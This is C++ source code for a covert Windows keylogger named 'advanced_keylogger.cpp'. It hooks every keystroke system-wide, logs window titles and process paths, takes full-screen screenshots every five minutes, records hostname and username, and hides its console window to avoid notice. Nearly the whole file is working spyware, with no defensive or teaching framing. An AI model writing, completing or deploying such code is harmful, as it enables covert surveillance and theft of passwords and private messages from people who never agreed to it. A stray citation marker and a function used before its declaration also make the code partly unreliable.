// advanced_keylogger.cpp
#include <windows.h>
#include <fstream>
#include <iostream>
#include <ctime>
#include <string>
#include <vector>
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")

using namespace std;
using namespace Gdiplus;

HHOOK keyboardHook;
ofstream logFile;
string currentWindow = "";
ULONG_PTR gdiplusToken;

// ============= WINDOW TRACKING =============
string GetActiveWindowTitle() {
    char windowTitle[256];
    HWND foregroundWindow = GetForegroundWindow();
    GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
    return string(windowTitle);
}

string GetActiveWindowProcess() {
    char processPath[MAX_PATH];
    HWND foregroundWindow = GetForegroundWindow();
    DWORD processId;
    GetWindowThreadProcessId(foregroundWindow, &processId);
    
    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
                                       FALSE, processId);
    if (processHandle) {
        GetModuleFileNameExA(processHandle, NULL, processPath, MAX_PATH);
        CloseHandle(processHandle);
        return string(processPath);
    }
    return "Unknown";
}

// ============= SCREENSHOT CAPTURE =============
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    
    GetImageEncodersSize(&num, &size);
    if(size == 0) return -1;
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if(pImageCodecInfo == NULL) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for(UINT j = 0; j < num; ++j) {
        if(wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }    
    }
    
    free(pImageCodecInfo);
    return -1;
}

void CaptureScreenshot() {
    // Get screen dimensions
    int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    
    // Create DCs
    HDC screenDC = GetDC(NULL);
    HDC memoryDC = CreateCompatibleDC(screenDC);
    
    // Create bitmap
    HBITMAP bitmap = CreateCompatibleBitmap(screenDC, x2, y2);
    SelectObject(memoryDC, bitmap);
    
    // Copy screen to bitmap
    BitBlt(memoryDC, 0, 0, x2, y2, screenDC, x1, y1, SRCCOPY);
    
    // Save bitmap
    time_t now = time(0);
    struct tm tstruct;
    char filename[100];
    localtime_s(&tstruct, &now);
    strftime(filename, sizeof(filename), "screenshot_%Y%m%d_%H%M%S.png", &tstruct);
    
    // Convert to GDI+ bitmap
    Gdiplus::Bitmap gdiBitmap(bitmap, NULL);
    CLSID pngClsid;
    GetEncoderClsid(L"image/png", &pngClsid);
    wchar_t wfilename[100];
    mbstowcs(wfilename, filename, 100);
    gdiBitmap.Save(wfilename, &pngClsid, NULL);
    
    // Cleanup
    DeleteObject(bitmap);
    DeleteDC(memoryDC);
    ReleaseDC(NULL, screenDC);
    
    // Log screenshot
    logFile.open("advanced_log.txt", ios::app);
    logFile << GetTimestamp() << " [SCREENSHOT] " << filename << "\n";
    logFile.close();
}

// ============= KEYBOARD HOOK =============
string GetTimestamp() {
    time_t now = time(0);
    char buffer[80];
    struct tm tstruct;
    localtime_s(&tstruct, &now);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &tstruct);
    return string(buffer);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyStruct->vkCode;
        
        // Check window change (every 10 key presses)
        static int keyCounter = 0;
        if (++keyCounter % 10 == 0) {
            string newWindow = GetActiveWindowTitle();
            if (newWindow != currentWindow) {
                currentWindow = newWindow;
                logFile.open("advanced_log.txt", ios::app);
                logFile << "\n" << GetTimestamp() << " [WINDOW] " 
                       << GetActiveWindowProcess() << " - " << currentWindow << "\n";
                logFile.close();
            }
        }
        
        // Log key
        logFile.open("advanced_log.txt", ios::app);
        
        if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
            // Handle letters and numbers
            bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
            bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);
            
            if (vkCode >= 'A' && vkCode <= 'Z') {
                if ((shiftPressed && !capsLock) || (!shiftPressed && capsLock)) {
                    logFile << (char)vkCode;
                } else {
                    logFile << (char)tolower(vkCode);
                }
            } else {
                // Numbers with shift
                if (shiftPressed) {
                    const char* shiftedNums = ")!@#$%^&*(";
                    int index = vkCode - '0';
                    logFile << shiftedNums[index];
                } else {
                    logFile << (char)vkCode;
                }
            }
        } else {
            // Special keys
            switch(vkCode) {
                case VK_SPACE: logFile << " "; break;
                case VK_RETURN: logFile << "\n"; break;
                case VK_TAB: logFile << "\t"; break;
                case VK_BACK: logFile << "[BACKSPACE]"; break;
                case VK_DELETE: logFile << "[DEL]"; break;
                case VK_ESCAPE: 
                    logFile << "[ESC]";
                    // Optional: stop on ESC
                    // PostQuitMessage(0);
                    break;
                default:
                    if (vkCode >= VK_F1 && vkCode <= VK_F12) {
                        logFile << "[F" << (vkCode - VK_F1 + 1) << "]";
                    }
                    break;
            }
        }
        
        logFile.close();
    }
    
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// ============= SCREENSHOT THREAD =============
DWORD WINAPI ScreenshotThread(LPVOID lpParam) {
    int interval = *(int*)lpParam;
    while (true) {
        Sleep(interval * 1000);
        CaptureScreenshot();
    }
    return 0;
}

// ============= MAIN =============
int main() {
    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Hide console
    HWND stealth;
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);
    
    // Initial log entry
    logFile.open("advanced_log.txt", ios::app);
    logFile << "\n" << string(50, '=') << "\n";
    logFile << "ADVANCED KEYLOGGER STARTED at " << GetTimestamp() << "\n";
    logFile << "Hostname: " << getenv("COMPUTERNAME") << "\n";
    logFile << "Username: " << getenv("USERNAME") << "\n";
    logFile << string(50, '=') << "\n\n";
    logFile.close();
    
    // Start screenshot thread (every 5 minutes)
    int screenshotInterval = 300;
    HANDLE screenshotHandle = CreateThread(NULL, 0, ScreenshotThread, 
                                           &screenshotInterval, 0, NULL);
    
    // Install keyboard hook [citation:2]
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
                                    GetModuleHandle(NULL), 0);
    
    if (keyboardHook == NULL) {
        return 1;
    }
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    UnhookWindowsHookEx(keyboardHook);
    GdiplusShutdown(gdiplusToken);
    return 0;
}